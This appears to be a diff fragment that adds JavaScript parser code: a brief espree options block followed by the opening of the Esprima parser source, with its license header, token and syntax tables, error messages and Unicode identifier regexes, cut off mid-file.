require(""../third_party/esprima"").parse;<\n>+        const ast = parse(`<\n>+        `);<\n>+var espree = require('espree');<\n>+module.exports = function (code) {<\n>+        // attach range information to each node<\n>+        range: true<c><\n>+        // attach line/column location information to each node<\n>+        loc: true<c><\n>+        // create a top-level comments array containing all comments<\n>+        comments: true<c><\n>+        // attach comments to the closest relevant node as leadingComments and<\n>+        // trailingComments<\n>+        attachComment: true<c><\n>+        // create a top-level tokens array containing all tokens<\n>+        tokens: true<c><\n>+        // try to continue parsing if an error is encountered<c> store errors in a<\n>+        // top-level errors array<\n>+        tolerant: true<c><\n>+        ecmaVersion: 6<c><\n>+        sourceType: ""module""<\n>+/*<\n>+  Copyright (C) 2013 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Copyright (C) 2013 Thaddee Tyl <thaddee.tyl@gmail.com><\n>+  Copyright (C) 2012 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Copyright (C) 2012 Mathias Bynens <mathias@qiwi.be><\n>+  Copyright (C) 2012 Joost-Wim Boekesteijn <joost-wim@boekesteijn.nl><\n>+  Copyright (C) 2012 Kris Kowal <kris.kowal@cixar.com><\n>+  Copyright (C) 2012 Yusuke Suzuki <utatane.tea@gmail.com><\n>+  Copyright (C) 2012 Arpad Borsos <arpad.borsos@googlemail.com><\n>+  Copyright (C) 2011 Ariya Hidayat <ariya.hidayat@gmail.com><\n>+  Redistribution and use in source and binary forms<c> with or without<\n>+  modification<c> are permitted provided that the following conditions are met:<\n>+    * Redistributions of source code must retain the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer.<\n>+    * Redistributions in binary form must reproduce the above copyright<\n>+      notice<c> this list of conditions and the following disclaimer in the<\n>+      documentation and/or other materials provided with the distribution.<\n>+  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>+  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>+  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>+  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>+  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>+  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>+  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>+  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>+  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>+  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>+*/<\n>+/*jslint bitwise:true plusplus:true */<\n>+/*global esprima:true<c> define:true<c> exports:true<c> window: true<c><\n>+throwError: true<c> generateStatement: true<c> peek: true<c><\n>+parseAssignmentExpression: true<c> parseBlock: true<c><\n>+parseClassExpression: true<c> parseClassDeclaration: true<c> parseExpression: true<c><\n>+parseForStatement: true<c><\n>+parseFunctionDeclaration: true<c> parseFunctionExpression: true<c><\n>+parseFunctionSourceElements: true<c> parseVariableIdentifier: true<c><\n>+parseImportSpecifier: true<c><\n>+parseLeftHandSideExpression: true<c> parseParams: true<c> validateParam: true<c><\n>+parseSpreadOrAssignmentExpression: true<c><\n>+parseStatement: true<c> parseSourceElement: true<c> parseConciseBody: true<c><\n>+parseYieldExpression: true<\n>+*/<\n>+(function (root<c> factory) {<\n>+    'use strict';<\n>+    // Universal Module Definition (UMD) to support AMD<c> CommonJS/Node.js<c><\n>+    // Rhino<c> and plain browser loading.<\n>+    /* istanbul ignore next */<\n>+    if (typeof define === 'function' && define.amd) {<\n>+        define(['exports']<c> factory);<\n>+    } else if (typeof exports !== 'undefined') {<\n>+        factory(exports);<\n>+    } else {<\n>+        factory((root.esprima = {}));<\n>+    }<\n>+    'use strict';<\n>+    var Token<c><\n>+        TokenName<c><\n>+        FnExprTokens<c><\n>+        Syntax<c><\n>+        PropertyKind<c><\n>+        Messages<c><\n>+        Regex<c><\n>+        SyntaxTreeDelegate<c><\n>+        ClassPropertyType<c><\n>+        source<c><\n>+        strict<c><\n>+        index<c><\n>+        lineNumber<c><\n>+        lineStart<c><\n>+        length<c><\n>+        delegate<c><\n>+        lookahead<c><\n>+        state<c><\n>+        extra;<\n>+    Token = {<\n>+        BooleanLiteral: 1<c><\n>+        EOF: 2<c><\n>+        Identifier: 3<c><\n>+        Keyword: 4<c><\n>+        NullLiteral: 5<c><\n>+        NumericLiteral: 6<c><\n>+        Punctuator: 7<c><\n>+        StringLiteral: 8<c><\n>+        RegularExpression: 9<c><\n>+        Template: 10<\n>+    };<\n>+    TokenName = {};<\n>+    TokenName[Token.BooleanLiteral] = 'Boolean';<\n>+    TokenName[Token.EOF] = '<end>';<\n>+    TokenName[Token.Identifier] = 'Identifier';<\n>+    TokenName[Token.Keyword] = 'Keyword';<\n>+    TokenName[Token.NullLiteral] = 'Null';<\n>+    TokenName[Token.NumericLiteral] = 'Numeric';<\n>+    TokenName[Token.Punctuator] = 'Punctuator';<\n>+    TokenName[Token.StringLiteral] = 'String';<\n>+    TokenName[Token.RegularExpression] = 'RegularExpression';<\n>+    // A function following one of those tokens is an expression.<\n>+    FnExprTokens = ['('<c> '{'<c> '['<c> 'in'<c> 'typeof'<c> 'instanceof'<c> 'new'<c><\n>+                    'return'<c> 'case'<c> 'delete'<c> 'throw'<c> 'void'<c><\n>+                    // assignment operators<\n>+                    '='<c> '+='<c> '-='<c> '*='<c> '/='<c> '%='<c> '<<='<c> '>>='<c> '>>>='<c><\n>+                    '&='<c> '|='<c> '^='<c> '<c>'<c><\n>+                    // binary/unary operators<\n>+                    '+'<c> '-'<c> '*'<c> '/'<c> '%'<c> '++'<c> '--'<c> '<<'<c> '>>'<c> '>>>'<c> '&'<c><\n>+                    '|'<c> '^'<c> '!'<c> '~'<c> '&&'<c> '||'<c> '?'<c> ':'<c> '==='<c> '=='<c> '>='<c><\n>+                    '<='<c> '<'<c> '>'<c> '!='<c> '!=='];<\n>+    Syntax = {<\n>+        ArrayExpression: 'ArrayExpression'<c><\n>+        ArrayPattern: 'ArrayPattern'<c><\n>+        ArrowFunctionExpression: 'ArrowFunctionExpression'<c><\n>+        AssignmentExpression: 'AssignmentExpression'<c><\n>+        BinaryExpression: 'BinaryExpression'<c><\n>+        BlockStatement: 'BlockStatement'<c><\n>+        BreakStatement: 'BreakStatement'<c><\n>+        CallExpression: 'CallExpression'<c><\n>+        CatchClause: 'CatchClause'<c><\n>+        ClassBody: 'ClassBody'<c><\n>+        ClassDeclaration: 'ClassDeclaration'<c><\n>+        ClassExpression: 'ClassExpression'<c><\n>+        ComprehensionBlock: 'ComprehensionBlock'<c><\n>+        ComprehensionExpression: 'ComprehensionExpression'<c><\n>+        ConditionalExpression: 'ConditionalExpression'<c><\n>+        ContinueStatement: 'ContinueStatement'<c><\n>+        DebuggerStatement: 'DebuggerStatement'<c><\n>+        DoWhileStatement: 'DoWhileStatement'<c><\n>+        EmptyStatement: 'EmptyStatement'<c><\n>+        ExportDeclaration: 'ExportDeclaration'<c><\n>+        ExportBatchSpecifier: 'ExportBatchSpecifier'<c><\n>+        ExportSpecifier: 'ExportSpecifier'<c><\n>+        ExpressionStatement: 'ExpressionStatement'<c><\n>+        ForInStatement: 'ForInStatement'<c><\n>+        ForOfStatement: 'ForOfStatement'<c><\n>+        ForStatement: 'ForStatement'<c><\n>+        FunctionDeclaration: 'FunctionDeclaration'<c><\n>+        FunctionExpression: 'FunctionExpression'<c><\n>+        Identifier: 'Identifier'<c><\n>+        IfStatement: 'IfStatement'<c><\n>+        ImportDeclaration: 'ImportDeclaration'<c><\n>+        ImportDefaultSpecifier: 'ImportDefaultSpecifier'<c><\n>+        ImportNamespaceSpecifier: 'ImportNamespaceSpecifier'<c><\n>+        ImportSpecifier: 'ImportSpecifier'<c><\n>+        LabeledStatement: 'LabeledStatement'<c><\n>+        Literal: 'Literal'<c><\n>+        LogicalExpression: 'LogicalExpression'<c><\n>+        MemberExpression: 'MemberExpression'<c><\n>+        MethodDefinition: 'MethodDefinition'<c><\n>+        ModuleSpecifier: 'ModuleSpecifier'<c><\n>+        NewExpression: 'NewExpression'<c><\n>+        ObjectExpression: 'ObjectExpression'<c><\n>+        ObjectPattern: 'ObjectPattern'<c><\n>+        Program: 'Program'<c><\n>+        Property: 'Property'<c><\n>+        ReturnStatement: 'ReturnStatement'<c><\n>+        SequenceExpression: 'SequenceExpression'<c><\n>+        SpreadElement: 'SpreadElement'<c><\n>+        SwitchCase: 'SwitchCase'<c><\n>+        SwitchStatement: 'SwitchStatement'<c><\n>+        TaggedTemplateExpression: 'TaggedTemplateExpression'<c><\n>+        TemplateElement: 'TemplateElement'<c><\n>+        TemplateLiteral: 'TemplateLiteral'<c><\n>+        ThisExpression: 'ThisExpression'<c><\n>+        ThrowStatement: 'ThrowStatement'<c><\n>+        TryStatement: 'TryStatement'<c><\n>+        UnaryExpression: 'UnaryExpression'<c><\n>+        UpdateExpression: 'UpdateExpression'<c><\n>+        VariableDeclaration: 'VariableDeclaration'<c><\n>+        VariableDeclarator: 'VariableDeclarator'<c><\n>+        WhileStatement: 'WhileStatement'<c><\n>+        WithStatement: 'WithStatement'<c><\n>+        YieldExpression: 'YieldExpression'<\n>+    };<\n>+    PropertyKind = {<\n>+        Data: 1<c><\n>+        Get: 2<c><\n>+        Set: 4<\n>+    };<\n>+    ClassPropertyType = {<\n>+        'static': 'static'<c><\n>+        prototype: 'prototype'<\n>+    };<\n>+    // Error messages should be identical to V8.<\n>+    Messages = {<\n>+        UnexpectedToken:  'Unexpected token %0'<c><\n>+        UnexpectedNumber:  'Unexpected number'<c><\n>+        UnexpectedString:  'Unexpected string'<c><\n>+        UnexpectedIdentifier:  'Unexpected identifier'<c><\n>+        UnexpectedReserved:  'Unexpected reserved word'<c><\n>+        UnexpectedTemplate:  'Unexpected quasi %0'<c><\n>+        UnexpectedEOS:  'Unexpected end of input'<c><\n>+        NewlineAfterThrow:  'Illegal newline after throw'<c><\n>+        InvalidRegExp: 'Invalid regular expression'<c><\n>+        UnterminatedRegExp:  'Invalid regular expression: missing /'<c><\n>+        InvalidLHSInAssignment:  'Invalid left-hand side in assignment'<c><\n>+        InvalidLHSInFormalsList:  'Invalid left-hand side in formals list'<c><\n>+        InvalidLHSInForIn:  'Invalid left-hand side in for-in'<c><\n>+        MultipleDefaultsInSwitch: 'More than one default clause in switch statement'<c><\n>+        NoCatchOrFinally:  'Missing catch or finally after try'<c><\n>+        UnknownLabel: 'Undefined label \'%0\''<c><\n>+        Redeclaration: '%0 \'%1\' has already been declared'<c><\n>+        IllegalContinue: 'Illegal continue statement'<c><\n>+        IllegalBreak: 'Illegal break statement'<c><\n>+        IllegalDuplicateClassProperty: 'Illegal duplicate property in class definition'<c><\n>+        IllegalReturn: 'Illegal return statement'<c><\n>+        IllegalYield: 'Illegal yield expression'<c><\n>+        IllegalSpread: 'Illegal spread element'<c><\n>+        StrictModeWith:  'Strict mode code may not include a with statement'<c><\n>+        StrictCatchVariable:  'Catch variable may not be eval or arguments in strict mode'<c><\n>+        StrictVarName:  'Variable name may not be eval or arguments in strict mode'<c><\n>+        StrictParamName:  'Parameter name eval or arguments is not allowed in strict mode'<c><\n>+        StrictParamDupe: 'Strict mode function may not have duplicate parameter names'<c><\n>+        ParameterAfterRestParameter: 'Rest parameter must be final parameter of an argument list'<c><\n>+        DefaultRestParameter: 'Rest parameter can not have a default value'<c><\n>+        ElementAfterSpreadElement: 'Spread must be the final element of an element list'<c><\n>+        ObjectPatternAsRestParameter: 'Invalid rest parameter'<c><\n>+        ObjectPatternAsSpread: 'Invalid spread argument'<c><\n>+        StrictFunctionName:  'Function name may not be eval or arguments in strict mode'<c><\n>+        StrictOctalLiteral:  'Octal literals are not allowed in strict mode.'<c><\n>+        StrictDelete:  'Delete of an unqualified identifier in strict mode.'<c><\n>+        StrictDuplicateProperty:  'Duplicate data property in object literal not allowed in strict mode'<c><\n>+        AccessorDataProperty:  'Object literal may not have data and accessor property with the same name'<c><\n>+        AccessorGetSet:  'Object literal may not have multiple get/set accessors with the same name'<c><\n>+        StrictLHSAssignment:  'Assignment to eval or arguments is not allowed in strict mode'<c><\n>+        StrictLHSPostfix:  'Postfix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>+        StrictLHSPrefix:  'Prefix increment/decrement may not have eval or arguments operand in strict mode'<c><\n>+        StrictReservedWord:  'Use of future reserved word in strict mode'<c><\n>+        MissingFromClause: 'Missing from clause'<c><\n>+        NoAsAfterImportNamespace: 'Missing as after import *'<c><\n>+        InvalidModuleSpecifier: 'Invalid module specifier'<c><\n>+        NoUnintializedConst: 'Const must be initialized'<c><\n>+        ComprehensionRequiresBlock: 'Comprehension must have at least one block'<c><\n>+        ComprehensionError:  'Comprehension Error'<c><\n>+        EachNotAllowed:  'Each is not supported'<\n>+    };<\n>+    // See also tools/generate-unicode-regex.py.<\n>+    Regex = {<\n>+        NonAsciiIdentifierStart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0\u08a2-\u08ac\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0977\u0979-\u097f\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d\u0c58\u0c59\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d60\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191c\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19c1-\u19c7\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005-\u3007\u3021-\u3029\u3031-\u3035\u3038-\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua697\ua6a0-\ua6ef\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa80-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<c><\n>+        NonAsciiIdentifierPart: new RegExp('[\xaa\xb5\xba\xc0-\xd6\xd8-\xf6\xf8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0300-\u0374\u0376\u0377\u037a-\u037d\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u0483-\u0487\u048a-\u0527\u0531-\u0556\u0559\u0561-\u0587\u0591-\u05bd\u05bf\u05c1\u05c2\u05c4\u05c5\u05c7\u05d0-\u05ea\u05f0-\u05f2\u0610-\u061a\u0620-\u0669\u066e-\u06d3\u06d5-\u06dc\u06df-\u06e8\u06ea-\u06fc\u06ff\u0710-\u074a\u074d-\u07b1\u07c0-\u07f5\u07fa\u0800-\u082d\u0840-\u085b\u08a0\u08a2-\u08ac\u08e4-\u08fe\u0900-\u0963\u0966-\u096f\u0971-\u0977\u0979-\u097f\u0981-\u0983\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bc-\u09c4\u09c7\u09c8\u09cb-\u09ce\u09d7\u09dc\u09dd\u09df-\u09e3\u09e6-\u09f1\u0a01-\u0a03\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a3c\u0a3e-\u0a42\u0a47\u0a48\u0a4b-\u0a4d\u0a51\u0a59-\u0a5c\u0a5e\u0a66-\u0a75\u0a81-\u0a83\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abc-\u0ac5\u0ac7-\u0ac9\u0acb-\u0acd\u0ad0\u0ae0-\u0ae3\u0ae6-\u0aef\u0b01-\u0b03\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3c-\u0b44\u0b47\u0b48\u0b4b-\u0b4d\u0b56\u0b57\u0b5c\u0b5d\u0b5f-\u0b63\u0b66-\u0b6f\u0b71\u0b82\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bbe-\u0bc2\u0bc6-\u0bc8\u0bca-\u0bcd\u0bd0\u0bd7\u0be6-\u0bef\u0c01-\u0c03\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c33\u0c35-\u0c39\u0c3d-\u0c44\u0c46-\u0c48\u0c4a-\u0c4d\u0c55\u0c56\u0c58\u0c59\u0c60-\u0c63\u0c66-\u0c6f\u0c82\u0c83\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbc-\u0cc4\u0cc6-\u0cc8\u0cca-\u0ccd\u0cd5\u0cd6\u0cde\u0ce0-\u0ce3\u0ce6-\u0cef\u0cf1\u0cf2\u0d02\u0d03\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d-\u0d44\u0d46-\u0d48\u0d4a-\u0d4e\u0d57\u0d60-\u0d63\u0d66-\u0d6f\u0d7a-\u0d7f\u0d82\u0d83\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0dca\u0dcf-\u0dd4\u0dd6\u0dd8-\u0ddf\u0df2\u0df3\u0e01-\u0e3a\u0e40-\u0e4e\u0e50-\u0e59\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb9\u0ebb-\u0ebd\u0ec0-\u0ec4\u0ec6\u0ec8-\u0ecd\u0ed0-\u0ed9\u0edc-\u0edf\u0f00\u0f18\u0f19\u0f20-\u0f29\u0f35\u0f37\u0f39\u0f3e-\u0f47\u0f49-\u0f6c\u0f71-\u0f84\u0f86-\u0f97\u0f99-\u0fbc\u0fc6\u1000-\u1049\u1050-\u109d\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u135d-\u135f\u1380-\u138f\u13a0-\u13f4\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16ee-\u16f0\u1700-\u170c\u170e-\u1714\u1720-\u1734\u1740-\u1753\u1760-\u176c\u176e-\u1770\u1772\u1773\u1780-\u17d3\u17d7\u17dc\u17dd\u17e0-\u17e9\u180b-\u180d\u1810-\u1819\u1820-\u1877\u1880-\u18aa\u18b0-\u18f5\u1900-\u191c\u1920-\u192b\u1930-\u193b\u1946-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u19d0-\u19d9\u1a00-\u1a1b\u1a20-\u1a5e\u1a60-\u1a7c\u1a7f-\u1a89\u1a90-\u1a99\u1aa7\u1b00-\u1b4b\u1b50-\u1b59\u1b6b-\u1b73\u1b80-\u1bf3\u1c00-\u1c37\u1c40-\u1c49\u1c4d-\u1c7d\u1cd0-\u1cd2\u1cd4-\u1cf6\u1d00-\u1de6\u1dfc-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u200c\u200d\u203f\u2040\u2054\u2071\u207f\u2090-\u209c\u20d0-\u20dc\u20e1\u20e5-\u20f0\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2160-\u2188\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d7f-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2de0-\u2dff\u2e2f\u3005-\u3007\u3021-\u302f\u3031-\u3035\u3038-\u303c\u3041-\u3096\u3099\u309a\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fcc\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua62b\ua640-\ua66f\ua674-\ua67d\ua67f-\ua697\ua69f-\ua6f1\ua717-\ua71f\ua722-\ua788\ua78b-\ua78e\ua790-\ua793\ua7a0-\ua7aa\ua7f8-\ua827\ua840-\ua873\ua880-\ua8c4\ua8d0-\ua8d9\ua8e0-\ua8f7\ua8fb\ua900-\ua92d\ua930-\ua953\ua960-\ua97c\ua980-\ua9c0\ua9cf-\ua9d9\uaa00-\uaa36\uaa40-\uaa4d\uaa50-\uaa59\uaa60-\uaa76\uaa7a\uaa7b\uaa80-\uaac2\uaadb-\uaadd\uaae0-\uaaef\uaaf2-\uaaf6\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uabc0-\uabea\uabec\uabed\uabf0-\uabf9\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe00-\ufe0f\ufe20-\ufe26\ufe33\ufe34\ufe4d-\ufe4f\ufe70-\ufe74\ufe76-\ufefc\uff10-\uff19\uff21-\uff3a\uff3f\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc]')<\n>+    };<\n>+    // Ensure the condition is true<c> otherwise throw an error.<\n>+    // This is only to have a better contract semantic<c> i.e. another safety net<\n>+    // to catch a logic error. The condition shall be fulfilled in normal case.<\n>+    // Do NOT use this to enforce a certain condition on any user input.<\n>+    function assert(condition<c> message) {<\n>+        /* istanbul ignore if */<\n>+        if (!condition) {<\n>+            throw new Error('ASSERT: ' + message);<\n>+        }<\n>+    }<\n>+    function StringMap() {<\n>+        this.$data = {};<\n>+    }<\n>+    StringMap.prototype.get = function (key) {<\n>+        key = '$' + key;<\n>+        return this.$data[key];<\n>+    };<\n>+    StringMap.prototype.set = function (key<c> value) {<\n>+        key = '$' + key;<\n>+        this.$data[key] = value;<\n>+        return this;<\n>+    };<\n>+    StringMap.prototype.has = function (key) {<\n>+        key = '$' + key;<\n>+        return Object.prototype.hasOwnProperty.call(this.$data<c> key);<\n>+    };<\n>+    